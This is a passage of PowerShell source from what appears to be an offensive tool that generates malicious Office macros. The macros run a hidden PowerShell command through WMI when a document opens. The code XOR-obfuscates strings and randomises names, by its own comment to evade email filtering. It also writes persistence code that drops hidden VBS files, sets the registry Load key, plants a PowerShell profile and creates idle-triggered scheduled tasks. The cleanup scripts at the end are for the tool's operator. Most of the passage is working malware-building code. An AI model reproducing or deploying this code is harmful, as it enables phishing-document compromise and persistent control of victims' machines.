        objProcess.Create str2, Null, objConfig, intProcessID
     End Function
"@
$global:Subs += "WriteBot","Persist"
return $execmacro, $schmacro
}
else{return $execmacro}
}


function AdvancedObfuscator($code){#generates advanced obfuscated macros that should get around all email filtering, good luck understanding this section
#TODO Add true deadcode generator
    function randstr{ #creates random strings, mostly used for key creation

    [CmdletBinding()]
    param(
	    [int]$Length
    )
    $set    = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
    $result = ""
    for ($x = 0; $x -lt $Length; $x++) {
        $result += $set | Get-Random
    }
    return $result
    }

    function random_vars{ #creates random variables that don't have a number in the beginning because vbscript doesn't allow that
        $i = 0
        $n = 21
        $length = 20
        [string[]]$retlist=""
        $retlist = @(0) * $n
        while ($i -lt $n){
            $mylen = Get-Random -minimum 10 -maximum 20
            $s = randstr $mylen
            if ($s -notmatch '^[0-9].+'){
                $retlist[$i] = $s
                $i += 1
            }
        }
        return $retlist
    }

    function vbs_xor{ #loosely based off of the psploitgen XOR function, XOR function for basic strings
        [CmdletBinding()]
        Param(
                [String]$key,

                [String]$data

        )
        $maxlen = 40
        $dataarr = $data.ToCharArray()
        #xored = ''.join(chr(ord(x) ^ ord(y)) for (x, y) in izip(data, cycle(key))) #python approach
        for($i=0; $i -lt $dataarr.Count; $i++){ #powershell approach with same result
        $xordata = [int][char]$dataarr[$i] -bxor [int][char]$key[$i]
        [string[]]$xored += [char]$xordata
        }
        $i = 1
        $out = ''
    
        foreach ($c in $xored){
            if (($i % $maxlen) -eq 0){
                $out += " _`n"
            }
            $d = [int][char]$c
            $out += "Chr($d)&"
            $i += 1
        }
        $out = $out.TrimEnd("&")
        return $out
    }

    function vbs_xor_ps{ #had to specialize the function for the ps command because of character line limitations in vbscript...
        [CmdletBinding()]
        Param(
                [String]$key,

                [String]$data

        )
        $maxlen = 40
        $dataarr = $data.ToCharArray()
        #xored = ''.join(chr(ord(x) ^ ord(y)) for (x, y) in izip(data, cycle(key))) #python approach
        for($i=0; $i -lt $dataarr.Count; $i++){ #powershell approach with same result
        $xordata = [int][char]$dataarr[$i] -bxor [int][char]$key[$i]
        [string[]]$xored += [char]$xordata
        }
        $i = 1
        foreach ($c in $xored){
            $d = [int][char]$c
            [string[]]$out += "Chr($d)&"
            $i += 1
        }
        $xlen = $out.Count
        $repeat = [math]::Floor($xlen / 40)

        [int]$x = 0
        [string[]]$out2 = 0 .. $repeat
        for($i=0;$i-lt$repeat;$i++){
            $start = 0 + $x
            $count = 40
            $out2[$i] = [string]::Join("",$out,$start,$count) 
            $x += 40
            $out2[$i] = $out2[$i].TrimEnd("&")
        }
        if($remainder=$xlen%40){
            $start = $repeat*40
            $out2[$repeat] = [string]::Join("",$out,$start,$remainder)
            $out2[$repeat] = $out2[$repeat].TrimEnd("&")
        }
        elseif($xlen%40 -eq 0){
            $out2[$repeat] = "`"`""
        }
        #$out = $out.TrimEnd("&")
        return $out2
    }

    function create_vb_macro{
        [CmdletBinding()]
        Param(
                [String]$cmd
        )
    
        Write-Host "[*] Creating Obfuscated Macro"
        $rv = random_vars #create an array to use for random variables for execution macro

        #Workaround to get powershell shared vbscript commands into the macro
        $mod = "Mod"
        $mid = "Mid$"
        $asc = "Asc"
        $chr = "Chr$"

        #Set random variables and XOR keys
        $key1 = randstr 64
        $key2 = randstr ($cmd.Length+5) #need to split into multiple variables with same code as obfuscator
        $key3 = randstr 46
        $key4 = randstr 64
        $key5 = randstr 50
        $key6 = randstr 45
        $sub1 = $rv[9] #ExecPowerShell
        $sub2 = $rv[8] #XORDec
        $r1 = $rv[7] #key 2 split
        $r2 = $rv[6] #xor_pscmd split
        $r3 = $rv[5] #XOR function variable
        $r4 = $rv[4] #PowerShell command
        $r5 = $rv[3] #XOR function variable
        $r6 = $rv[2] #Data string input for XOR
        $r7 = $rv[1] #XOR function variable
        $r8 = $rv[0] #XOR function variable
        $r9 = $rv[10] #objWMIService
        $r10 = $rv[11] #HIDDENWINDOW
        $r11 = $rv[12] #objStartup
        $r12 = $rv[13] #objConfig
        $r13 = $rv[14] #objProcess
        $r14 = $rv[15] #PowerShell command reassign
        
        #setting global subs
        [string[]]$global:Subs = $sub1

        # Split $key2 into multiple variables because it's too long for vbscript
        [string[]]$key2full = Split-ByLength $key2 -Split 50
        $key2split = "`t`tDim $r1 As String`n"
        $key2split += "`t`t$r1 = `""+$key2full[0]+"`"`n"
        foreach ($kelement in $key2full[1..($key2full.Length-1)]){
        $key2split += "`t`t$r1 = $r1 + `"$kelement`"`n"}

        # create wmi strings for vbscript XOR
        $wmimgmts1 = "winmgmts:\\.\root\cimv2"
        $win32proc = "Win32_ProcessStartup"
        $wmimgmts2 = "winmgmts:\\.\root\cimv2:Win32_Process"
        $pptcode = ""
        
        #adds additional line to continue to next slide if the document is a ppt
        if($global:doctype -eq "ppt" -or $global:doctype -eq "pps"){
        $pptcode = "ActivePresentation.SlideShowWindow.View.GotoSlide(2)"}


        # create XOR strings
        $xor_wmimgmts1 = vbs_xor -data $wmimgmts1 -key $key1
        $xor_pscmd = vbs_xor_ps -data $cmd -key $key2
        $xor_win32proc = vbs_xor -data $win32proc -key $key3
        $xor_wmimgmts2 = vbs_xor -data $wmimgmts2 -key $key4
        $xor_pskeyvar = vbs_xor -data $r1 -key $key5
        $xor_psvar = vbs_xor -data $r4 -key $key6

        # Split $xor_pscmd into multiple variables because it's too long for vbscript
        $pssplit = "`t`tDim $r2 As String`n"
        $pssplit += "`t`t$r2 = "+$xor_pscmd[0]+"`n"
        foreach ($pselement in $xor_pscmd[1..($xor_pscmd.Length-1)]){
        $pssplit += "`t`t$r2 = $r2 + $pselement`n"}

        # compile execution macro that is used in all attack types    
        $execmacro = @"
Sub $sub1()
$key2split
$pssplit
  Const $r10 = 0
  Set $r9 = GetObject($sub2($xor_wmimgmts1,`"$key1`"))
  $r4 = $sub2($r2,$r1)
  Set $r11 = $r9.Get($sub2($xor_win32proc,`"$key3`"))
  Set $r12 = $r11.SpawnInstance_
  $r14 = $r4
  $r12.ShowWindow = $r10
  Set $r13 = GetObject($sub2($xor_wmimgmts2,`"$key4`"))
  $r13.Create $r14, Null, $r12, intProcessID
  $pptcode
End Sub

Private Function $sub2(ByVal $r6 As String, ByVal $r7 As String) As String
 Dim $r8 As Integer: Dim $r3 As Integer: Dim $r5 As String
 $r8 = Len($r7$)
 For $r3 = 1 To Len($r6)
   $r5 = $asc($mid($r7$, ($r3 $mod $r8) - $r8 * (($r3 $mod $r8) = 0), 1))
   $mid($r6, $r3, 1) = $chr($asc($mid($r6, $r3, 1)) Xor $r5)
 Next
 $sub2 = $r6
End Function`n
"@ 


        if ($RegFlag){ #creates registry load persistence macro code
        
        $rvs = random_vars #create an array to use for random variables for execution macro

        #Workaround to get powershell shared vbscript commands into the macro
        $mod = "Mod"
        $mid = "Mid$"
        $asc = "Asc"
        $chr = "Chr$"

        #Set random variables and XOR keys
        $pskey = randstr ($cmd.Length+5) #need to split into multiple variables for deal with vba line limitations
        $pkey1 = randstr 56
        $pkey2 = randstr 56
        $pkey3 = randstr 48
        $pkey4 = randstr 64
        $pkey5 = randstr 105
        $pkey6 = randstr 80
        $pkey7 = randstr 64
        $pkey8 = randstr 36
        $pkey9 = randstr 24
        $pkey10 = randstr 27
        $pkey11 = randstr 64
        $pkey12 = randstr 32
        $pkey13 = randstr 64
        $pkey14 = randstr 64
        $psub1 = $rvs[9] #Persist
        $psub2 = $rvs[8] #Reg
        $psub3 = $rvs[15] #Start
        $pr1 = $rvs[7] #key 2 split
        $pr2 = $rvs[6] #xor_pscmd split
        $pr3 = $rvs[5] #fs
        $pr4 = $rvs[4] #PowerShell command
        $pr5 = $rvs[3] #a
        $pr6 = $rvs[2] #Data string input for XOR
        $pr7 = $rvs[1] #GivenLocation
        $pr8 = $rvs[0] #oldfilename
        $pr9 = $rvs[10] #newfilename
        $pr10 = $rvs[11] #WshShell
        $pr11 = $rvs[12] #objShell
        $pr12 = $rvs[13] #command
        $pr13 = $rvs[14] #combines powershell directory and execution
        #sub2 is still being called for XOR decoding functionality
        
        #setting global subs
        $global:Subs += $psub1,$psub2,$psub3

        # Split $pkey2 into multiple variables because it's too long for vbscript
        [string[]]$pskeyfull = Split-ByLength $pskey -Split 50
        $pskeysplit = "`t`tDim $pr1 As String`n"
        $pskeysplit += "`t`t$pr1 = `""+$pskeyfull[0]+"`"`n"
        foreach ($kelement in $pskeyfull[1..($pskeyfull.Length-1)]){
        $pskeysplit += "`t`t$pr1 = $pr1 + `"$kelement`"`n"}

        # create strings for vbscript XOR
        $scriptingobject = "Scripting.FileSystemObject"
        $oldpath = "C:\Users\Public\config.txt"
        $wdeclareobjshell = "Dim $pr11"
        $wsetobjshell = "Set $pr11 = WScript.CreateObject(`"WScript.Shell`")"
        $wpcommand = "$pr12 = `"C:\WINDOWS\system32\WindowsPowerShell\v1.0\"
        $wobjshellrun = "$pr11.Run $pr12,0"
        $wobjshellnull = "Set $pr11 = Nothing"
        $newpath = "C:\Users\Public\config.vbs"
        $wscript = "WScript.Shell"
        $regloc = "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load"
        $vbsexec = "wscript C:\Users\Public\config.vbs"


        # create XOR strings
        $pxor_pscmd = vbs_xor_ps -data $cmd -key $pskey

        $pxor_scriptingobject = vbs_xor -data $scriptingobject -key $pkey1
        $pxor_oldpath = vbs_xor -data $oldpath -key $pkey2
        $pxor_wdeclareobjshell = vbs_xor -data $wdeclareobjshell -key $pkey3
        $pxor_wsetobjshell = vbs_xor -data $wsetobjshell -key $pkey4
        $pxor_wpcommand = vbs_xor -data $wpcommand -key $pkey5
        $pxor_wobjshellrun = vbs_xor -data $wobjshellrun -key $pkey6
        $pxor_wobjshellnull = vbs_xor -data $wobjshellnull -key $pkey7
        $pxor_newpath = vbs_xor -data $newpath -key $pkey11
        $pxor_wscript = vbs_xor -data $wscript -key $pkey12
        $pxor_regloc = vbs_xor -data $regloc -key $pkey13
        $pxor_vbsexec = vbs_xor -data $vbsexec -key $pkey14

        # Split $xor_pscmd into multiple variables because it's too long for vbscript
        $ppssplit = "`t`tDim $pr2 As String`n"
        $ppssplit += "`t`t$pr2 = "+$pxor_pscmd[0]+"`n"
        foreach ($pselement in $pxor_pscmd[1..($pxor_pscmd.Length-1)]){
        $ppssplit += "`t`t$pr2 = $pr2 + $pselement`n"}

        #compile macro
        $regmacro = @"
Public Function $psub1 As Variant
$pskeysplit
$ppssplit
  Set $pr3 = CreateObject($sub2($pxor_scriptingobject,`"$pkey1`"))
  $pr4 = $sub2($pr2,$pr1)
  $pr13 = $sub2($pxor_wpcommand,`"$pkey5`") & $pr4 & """"
  Set $pr5 = $pr3.CreateTextFile($sub2($pxor_oldpath,`"$pkey2`"), True)
  $pr5.WriteLine ($sub2($pxor_wdeclareobjshell,`"$pkey3`"))
  $pr5.WriteLine ($sub2($pxor_wsetobjshell,`"$pkey4`"))
  $pr5.WriteLine ($pr13)
  $pr5.WriteLine ($sub2($pxor_wobjshellrun,`"$pkey6`"))
  $pr5.WriteLine ($sub2($pxor_wobjshellnull,`"$pkey7`"))
  $pr5.Close
  $pr3.CopyFile $sub2($pxor_oldpath,`"$pkey2`"), $sub2($pxor_newpath,`"$pkey11`")
  $pr3.DeleteFile $sub2($pxor_oldpath,`"$pkey2`")
  SetAttr $sub2($pxor_newpath,`"$pkey11`"), vbHidden
  $pptcode
End Function

Public Function $psub2 As Variant
  Set $pr10 = CreateObject($sub2($pxor_wscript,`"$pkey12`"))
  $pr10.RegWrite $sub2($pxor_regloc,`"$pkey13`"), $sub2($pxor_newpath,`"$pkey11`"), "REG_SZ"
  Set $pr10 = Nothing
End Function

Public Function $psub3 As Variant
  Shell $sub2($pxor_vbsexec,`"$pkey14`"), vbNormalFocus
End Function
"@

        return $execmacro, $regmacro
        }
        elseif($ProFlag){ #creates powershell profile persistence macro code
        $rvs = random_vars #create an array to use for random variables for execution macro

        #Workaround to get powershell shared vbscript commands into the macro
        $mod = "Mod"
        $mid = "Mid$"
        $asc = "Asc"
        $chr = "Chr$"

        #Set random variables and XOR keys
        $pskey = randstr ($cmd.Length+5) #need to split into multiple variables for deal with vba line limitations
        $pkey1 = randstr 56
        $pkey2 = randstr 64
        $pkey3 = randstr 48
        $pkey4 = randstr 64
        $pkey5 = randstr 105
        $pkey6 = randstr 80
        $pkey7 = randstr 64
        $pkey8 = randstr 60
        $pkey9 = randstr 68
        $pkey10 = randstr 27
        $pkey11 = randstr 64
        $pkey12 = randstr 32
        $pkey13 = randstr 64
        $pkey14 = randstr 64
        $psub1 = $rvs[9] #Persist
        $psub2 = $rvs[8] #Reg
        $psub3 = $rvs[15] #Start
        $pr1 = $rvs[7] #key 2 split
        $pr2 = $rvs[6] #xor_pscmd split
        $pr3 = $rvs[5] #fs
        $pr4 = $rvs[4] #PowerShell command
        $pr5 = $rvs[3] #a
        $pr6 = $rvs[2] #Data string input for XOR
        $pr7 = $rvs[1] #fs2
        $pr8 = $rvs[0] #a2
        $pr9 = $rvs[10] #newfilename
        $pr10 = $rvs[11] #WshShell
        $pr11 = $rvs[12] #objShell
        $pr12 = $rvs[13] #command
        $pr13 = $rvs[14] #testing
        #sub2 is still being called for XOR decoding functionality
        
        #setting global subs
        $global:Subs += $psub1,$psub2,$psub3

        # Split $pkey2 into multiple variables because it's too long for vbscript
        [string[]]$pskeyfull = Split-ByLength $pskey -Split 50
        $pskeysplit = "`t`tDim $pr1 As String`n"
        $pskeysplit += "`t`t$pr1 = `""+$pskeyfull[0]+"`"`n"
        foreach ($kelement in $pskeyfull[1..($pskeyfull.Length-1)]){
        $pskeysplit += "`t`t$pr1 = $pr1 + `"$kelement`"`n"}

        # create strings for vbscript XOR
        $scriptingobject = "Scripting.FileSystemObject"
        $oldpath = "C:\Users\Default\AppData\Roaming\Microsoft\Windows\cookie.txt"
        $wdeclareobjshell = "Dim $pr11"
        $wsetobjshell = "Set $pr11 = WScript.CreateObject(`"WScript.Shell`")"
        $wpcommand = "$pr12 = `"C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe`""
        $wobjshellrun = "$pr11.Run $pr12,0"
        $wobjshellnull = "Set $pr11 = Nothing"
        $newpath = "C:\Users\Default\AppData\Roaming\Microsoft\Windows\cookie.vbs"
        $wscript = "WScript.Shell"
        $regloc = "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load"
        $vbsexec = "wscript C:\Users\Public\config.vbs"
        $oldpath2 = "C:\Windows\SysNative\WindowsPowerShell\v1.0\Profile.txt"
        $newpath2 = "C:\Windows\SysNative\WindowsPowerShell\v1.0\Profile.ps1"


        # create XOR strings
        $pxor_pscmd = vbs_xor_ps -data $cmd -key $pskey

        $pxor_scriptingobject = vbs_xor -data $scriptingobject -key $pkey1
        $pxor_oldpath = vbs_xor -data $oldpath -key $pkey2
        $pxor_wdeclareobjshell = vbs_xor -data $wdeclareobjshell -key $pkey3
        $pxor_wsetobjshell = vbs_xor -data $wsetobjshell -key $pkey4
        $pxor_wpcommand = vbs_xor -data $wpcommand -key $pkey5
        $pxor_wobjshellrun = vbs_xor -data $wobjshellrun -key $pkey6
        $pxor_wobjshellnull = vbs_xor -data $wobjshellnull -key $pkey7
        $pxor_newpath = vbs_xor -data $newpath -key $pkey11
        $pxor_wscript = vbs_xor -data $wscript -key $pkey12
        $pxor_regloc = vbs_xor -data $regloc -key $pkey13
        $pxor_oldpath2 = vbs_xor -data $oldpath2 -key $pkey8
        $pxor_newpath2 = vbs_xor -data $newpath2 -key $pkey9


        # Split $xor_pscmd into multiple variables because it's too long for vbscript
        $ppssplit = "`t`tDim $pr2 As String`n"
        $ppssplit += "`t`t$pr2 = "+$pxor_pscmd[0]+"`n"
        foreach ($pselement in $pxor_pscmd[1..($pxor_pscmd.Length-1)]){
        $ppssplit += "`t`t$pr2 = $pr2 + $pselement`n"}


        #compile macro
        $profmacro = @"
Public Function $psub1 As Variant
  Set $pr3 = CreateObject($sub2($pxor_scriptingobject,`"$pkey1`"))
  $pr13 = $sub2($pxor_wpcommand,`"$pkey5`")
  Set $pr5 = $pr3.CreateTextFile($sub2($pxor_oldpath,`"$pkey2`"), True)
  $pr5.WriteLine ($sub2($pxor_wdeclareobjshell,`"$pkey3`"))
  $pr5.WriteLine ($sub2($pxor_wsetobjshell,`"$pkey4`"))
  $pr5.WriteLine ($pr13)
  $pr5.WriteLine ($sub2($pxor_wobjshellrun,`"$pkey6`"))
  $pr5.WriteLine ($sub2($pxor_wobjshellnull,`"$pkey7`"))
  $pr5.Close
  $pr3.CopyFile $sub2($pxor_oldpath,`"$pkey2`"), $sub2($pxor_newpath,`"$pkey11`")
  $pr3.DeleteFile $sub2($pxor_oldpath,`"$pkey2`")
  SetAttr $sub2($pxor_newpath,`"$pkey11`"), vbHidden
  $pptcode
End Function

Public Function $psub2 As Variant
$pskeysplit
$ppssplit
  Set $pr7 = CreateObject($sub2($pxor_scriptingobject,`"$pkey1`"))
  $pr4 = $sub2($pr2,$pr1)
  Set $pr8 = $pr7.CreateTextFile($sub2($pxor_oldpath2,`"$pkey8`"), True)
  $pr8.WriteLine ($pr4)
  $pr8.Close
  $pr7.CopyFile $sub2($pxor_oldpath2,`"$pkey8`"), $sub2($pxor_newpath2,`"$pkey9`")
  $pr7.DeleteFile $sub2($pxor_oldpath2,`"$pkey8`")
  SetAttr $sub2($pxor_newpath2,`"$pkey9`"), vbHidden
End Function

Public Function $psub3 As Variant
  Set $pr10 = CreateObject($sub2($pxor_wscript,`"$pkey12`"))
  $pr10.RegWrite $sub2($pxor_regloc,`"$pkey13`"), $sub2($pxor_newpath,`"$pkey11`"), "REG_SZ"
  Set $pr10 = Nothing
End Function
"@

        return $execmacro, $profmacro
        }
        elseif($SchFlag){ #creates schtasks persistence macro code
        $rvs = random_vars #create an array to use for random variables for execution macro

        #Workaround to get powershell shared vbscript commands into the macro
        $mod = "Mod"
        $mid = "Mid$"
        $asc = "Asc"
        $chr = "Chr$"

        #Set random variables and XOR keys
        $pskey = randstr ($cmd.Length+5) #need to split into multiple variables for deal with vba line limitations
        $pkey1 = randstr 56
        $pkey2 = randstr 64
        $pkey3 = randstr 48
        $pkey4 = randstr 64
        $pkey5 = randstr 105
        $pkey6 = randstr 100
        $pkey7 = randstr 64
        $pkey8 = randstr 60
        $pkey9 = randstr 68
        $pkey10 = randstr 27
        $pkey11 = randstr 64
        $pkey12 = randstr 32
        $pkey13 = randstr 64
        $pkey14 = randstr 64
        $psub1 = $rvs[9] #WriteBot
        $psub2 = $rvs[8] #Persist
        $pr1 = $rvs[7] #key 2 split
        $pr2 = $rvs[6] #xor_pscmd split
        $pr3 = $rvs[5] #taskrun
        $pr4 = $rvs[4] #PowerShell command
        $pr5 = $rvs[3] #a
        $pr6 = $rvs[2] #str2
        $pr7 = $rvs[1] #fs2
        $pr8 = $rvs[0] #oldfile
        $pr9 = $rvs[10] #newfile
        $pr10 = $rvs[11] #oldfilepath
        $pr11 = $rvs[12] #set objshell
        $pr12 = $rvs[13] #newfilepath
        $pr13 = $rvs[14] #temp
        $pr14 = $rvs[15] #execute schtask
        $pr15 = $rvs[16] #HIDDEN
        $pr16 = $rvs[17] #r9
        $pr17 = $rvs[18] #temp
        $pr18 = $rvs[19] #temp
        $pr19 = $rvs[20] #temp
        #sub2 is still being called for XOR decoding functionality
        
        #setting global subs
        $global:Subs += $psub1,$psub2

        # Split $pkey2 into multiple variables because it's too long for vbscript
        [string[]]$pskeyfull = Split-ByLength $pskey -Split 50
        $pskeysplit = "`t`tDim $pr1 As String`n"
        $pskeysplit += "`t`t$pr1 = `""+$pskeyfull[0]+"`"`n"
        foreach ($kelement in $pskeyfull[1..($pskeyfull.Length-1)]){
        $pskeysplit += "`t`t$pr1 = $pr1 + `"$kelement`"`n"}

        # create strings for vbscript XOR
        $scriptingobject = "Scripting.FileSystemObject"
        $wsetobjshell = "Set $pr11 = WScript.CreateObject(`"WScript.Shell`")"
        $wscript = "WScript.Shell"
        $regloc = "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load"
        $temp = "%Temp%"
        $str1 = "$pr11.run(`""
        $str3 = "`"), 0, true"
        $oldfile = "\updater.txt"
        $newfile = "\updater.vbs"
        $taskrun = "`"cmd.exe /c cscript "
        $tasksched = "cmd.exe /c schtasks /create /TN $global:TaskName /F /SC onidle /i $global:TimeDelay /TR "
        $wmimgmts1 = "winmgmts:\\.\root\cimv2"
        $win32proc = "Win32_ProcessStartup"
        $wmimgmts2 = "winmgmts:\\.\root\cimv2:Win32_Process"


        # create XOR strings
        $pxor_pscmd = vbs_xor_ps -data $cmd -key $pskey

        $pxor_scriptingobject = vbs_xor -data $scriptingobject -key $pkey1
        $pxor_oldfile = vbs_xor -data $oldfile -key $pkey2
        $pxor_newfile = vbs_xor -data $newfile -key $pkey3
        $pxor_wsetobjshell = vbs_xor -data $wsetobjshell -key $pkey4
        $pxor_taskrun = vbs_xor -data $taskrun -key $pkey5
        $pxor_tasksched = vbs_xor -data $tasksched -key $pkey6
        $pxor_wmimgmts1 = vbs_xor -data $wmimgmts1 -key $pkey7
        $pxor_temp = vbs_xor -data $temp -key $pkey8
        $pxor_str1 = vbs_xor -data $str1 -key $pkey9
        $pxor_str3 = vbs_xor -data $str3 -key $pkey10
        $pxor_win32proc = vbs_xor -data $win32proc -key $pkey11
        $pxor_wscript = vbs_xor -data $wscript -key $pkey12
        $pxor_wmimgmts2 = vbs_xor -data $wmimgmts2 -key $pkey13


        # Split $xor_pscmd into multiple variables because it's too long for vbscript
        $ppssplit = "`t`tDim $pr2 As String`n"
        $ppssplit += "`t`t$pr2 = "+$pxor_pscmd[0]+"`n"
        foreach ($pselement in $pxor_pscmd[1..($pxor_pscmd.Length-1)]){
        $ppssplit += "`t`t$pr2 = $pr2 + $pselement`n"}


        #create macro
        $schmacro = @"
Public Function $psub1 As Variant
$pskeysplit
$ppssplit
  Set $pr7 = CreateObject($sub2($pxor_scriptingobject,`"$pkey1`"))
  $pr4 = $sub2($pr2,$pr1)
  $pr6 = $sub2($pxor_str1,`"$pkey9`") & $pr4 & $sub2($pxor_str3,`"$pkey10`")
  $pr13 = CreateObject($sub2($pxor_wscript,`"$pkey12`")).ExpandEnvironmentStrings($sub2($pxor_temp,`"$pkey8`"))
  $pr8 = $sub2($pxor_oldfile,`"$pkey2`")
  $pr9 = $sub2($pxor_newfile,`"$pkey3`")
  $pr10 = $pr13 & $pr8
  $pr12 = $pr13 & $pr9
  Set $pr5 = $pr7.CreateTextFile($pr10, True)
  $pr5.WriteLine ($sub2($pxor_wsetobjshell,`"$pkey4`"))
  $pr5.WriteLine ($pr6)
  $pr5.Close
  $pr7.CopyFile $pr10, $pr12
  $pr7.DeleteFile $pr10
  $pptcode
End Function

Public Function $psub2 As Variant
  $pr13 = CreateObject($sub2($pxor_wscript,`"$pkey12`")).ExpandEnvironmentStrings($sub2($pxor_temp,`"$pkey8`"))
  $pr9 = $sub2($pxor_newfile,`"$pkey3`")
  $pr12 =  $pr13 & $pr9
  $pr3 = $sub2($pxor_taskrun,`"$pkey5`") & $pr12 & """"
  $pr14 = $sub2($pxor_tasksched,`"$pkey6`") & $pr3
  Const $pr15 = 0
  Set $pr16 = GetObject($sub2($pxor_wmimgmts1,`"$pkey7`"))
  Set $pr17 = $pr16.Get($sub2($pxor_win32proc,`"$pkey11`"))
  Set $pr18 = $pr17.SpawnInstance_
  $pr18.ShowWindow = $pr15
  Set $pr19 = GetObject($sub2($pxor_wmimgmts2,`"$pkey13`"))
  $pr19.Create $pr14, Null, $pr18, intProcessID
End Function
"@
        return $execmacro, $schmacro
        }
        else{# send vba macro out as array
        return $execmacro
        }
        }
$macros = create_vb_macro -cmd $code
return $macros
}

function SubCreator{ #takes all the functions that are added in the macros to the $global:Subs variable and lays them out to execute in the docs
if ($global:Subs.Count -gt 1){
$substring = [string]::Join(" : ",$global:Subs,0,$global:Subs.count)}
elseif ($global:Subs.Count -eq 1){
$substring = $global:Subs}
else{
Write-Host "[!] Error finding sub functions for macro."}

if ($global:doctype -eq "ppt" -or $global:doctype -eq "pps"){
$subexecute=@"
Sub NextSlide(): $substring `: End Sub
"@
}
else{
$subexecute=@"
Sub AutoOpen(): $substring `: End Sub
Sub Auto_Open(): $substring `: End Sub
Sub Workbook_Open(): $substring `: End Sub
"@
}

return $subexecute 
}



function Split-ByLength{
    <#
    .SYNOPSIS
    Splits string up by Split length.
 
    .DESCRIPTION
    Convert a string with a varying length of characters to an array formatted to a specific number of characters per item.
 
    .EXAMPLE
    Split-ByLength '012345678901234567890123456789123' -Split 10
 
    0123456789
    0123456789
    0123456789
    123
 
    .LINK
    http://stackoverflow.com/questions/17171531/powershell-string-to-array/17173367#17173367
    #>
 
    [cmdletbinding()]
    param(
        [Parameter(ValueFromPipeline=$true)]
        [string[]]$InputObject,
 
        [int]$Split=10
    )
    begin{}
    process{
        foreach($string in $InputObject){
            $len = $string.Length
 
            $repeat=[Math]::Floor($len/$Split)
 
            for($i=0;$i-lt$repeat;$i++){
                #Write-Output ($string[($i*$Split)..($i*$Split+$Split-1)])
                Write-Output $string.Substring($i*$Split,$Split)
            }
            if($remainder=$len%$split){
                #Write-Output ($string[($len-$remainder)..($len-1)])
                Write-Output $string.Substring($len-$remainder)
            }
        }        
    }
    end{}
}

function Custom-Macro([string[]]$Code) {
#Inserts custom inputted macro directly into a document...you could have copy and pasted it with less trouble...
if ($global:doctype -eq "xls"){
CreateExcel $Code}
elseif($global:doctype -eq "doc"){
CreateWord $Code}

}

function Registry-Persistence-Clean {
<#
.SYNOPSIS
Uses registry to persist after reboot
.DESCRIPTION
Drops a hidden VBS file and creates a registry key to execute on startup
#>
#Create Clean-up Script
New-Item $env:userprofile\Desktop\RegistryCleanup.ps1 -type file | Out-Null
$RegistryCleanup = @'
if(Test-Path "C:\Users\Public\config.vbs"){
try{
Remove-Item "C:\Users\Public\config.vbs" -Force
Write-Host "[*]Successfully Removed config.vbs from C:\Users\Public"}catch{Write-Host "[!]Unable to remove config.vbs from C:\Users\Public"}
}else{Write-Host "[!]Path not valid"}
$Reg = "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows"
$RegQuery = Get-ItemProperty $Reg | Select-Object "Load"
if($RegQuery.Load -eq "C:\Users\Public\config.vbs"){
try{
Remove-ItemProperty -Path $Reg -Name "Load"
Write-Host "[*]Successfully Removed Malicious Load entry from HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows"}catch{Write-Host "[!]Unable to remove Registry Entry"}
}else{Write-Host "[!]Path not valid"}
'@
$RegistryCleanup | Out-File $env:userprofile\Desktop\RegistryCleanup.ps1 | Out-Null
Write-Host "Clean-up Script located at $env:userprofile\Desktop\RegistryCleanup.ps1"

}

function PowerShellProfile-Persistence-Clean{
<#
.SYNOPSIS
Uses registry to persist after reboot
.DESCRIPTION
Drops a hidden VBS file and creates a registry key to execute on startup
#>
#Create Clean-up Script
New-Item $env:userprofile\Desktop\PowerShellProfileCleanup.ps1 -type file | Out-Null
$PowerShellProfileCleanup = @'
if(Test-Path "C:\Users\Default\AppData\Roaming\Microsoft\Windows\cookie.vbs"){
try{
Remove-Item "C:\Users\Default\AppData\Roaming\Microsoft\Windows\cookie.vbs" -Force
Write-Host "[*]Successfully Removed cookie.vbs from C:\Users\Default\AppData\Roaming\Microsoft\Windows"}catch{Write-Host "[!]Unable to remove cookie.vbs from C:\Users\Default\AppData\Roaming\Microsoft\Windows"}
}else{Write-Host "[!]Path not valid"}
if(Test-Path "C:\Windows\System32\WindowsPowerShell\v1.0\Profile.ps1"){
try{
Remove-Item "C:\Windows\System32\WindowsPowerShell\v1.0\Profile.ps1" -Force
Write-Host "[*]Successfully Removed Profile.ps1 from C:\Windows\System32\WindowsPowerShell\v1.0"}catch{Write-Host "[!]Unable to remove Profile.ps1 from C:\Windows\System32\WindowsPowerShell\v1.0"}
}else{Write-Host "[!]Path not valid"}
$Reg = "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows"
$RegQuery = Get-ItemProperty $Reg | Select-Object "Load"
if($RegQuery.Load -eq "C:\Users\Default\AppData\Roaming\Microsoft\Windows\cookie.vbs"){
try{
Remove-ItemProperty -Path $Reg -Name "Load"
Write-Host "[*]Successfully Removed Malicious Load entry from HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows"}catch{Write-Host "[!]Unable to remove Registry Entry"}
}else{Write-Host "[!]Path not valid"}
'@
$PowerShellProfileCleanup | Out-File $env:userprofile\Desktop\PowerShellProfileCleanup.ps1 | Out-Null
Write-Host "Clean-up Script located at $env:userprofile\Desktop\PowerShellProfileCleanup.ps1"
}

function SchTaskPersistence-Clean{
<#
.SYNOPSIS
Uses schtasks on idle time to persist consistently
.DESCRIPTION
Drops a VBS file and creates a registry key to execute on n idle time
#>
#Create Clean-up Script
New-Item $env:userprofile\Desktop\SchTaskCleanup.ps1 -type file | Out-Null
$aenvtemp = "`$env:TEMP"
$SchTaskCleanup = @"
Set-Location $aenvtemp
if(Test-Path updater.vbs){
try{
Remove-Item "$aenvtemp\updater.vbs" -Force
Write-Host "[*]Successfully Removed updater.vbs from $aenvtemp"}catch{Write-Host "[!]Unable to remove updater.vbs from $aenvtemp"}
}else{Write-Host "[!]Path not valid"}
`$TaskName = "$global:TaskName"
`$CheckTask = SCHTASKS /QUERY /TN $global:TaskName
try{
SCHTASKS /Delete /TN $global:TaskName /F
}catch{Write-Host "[!]Unable to remove malicious task named $global:TaskName"}
"@
$SchTaskCleanup | Out-File $env:userprofile\Desktop\SchTaskCleanup.ps1 -Force | Out-Null
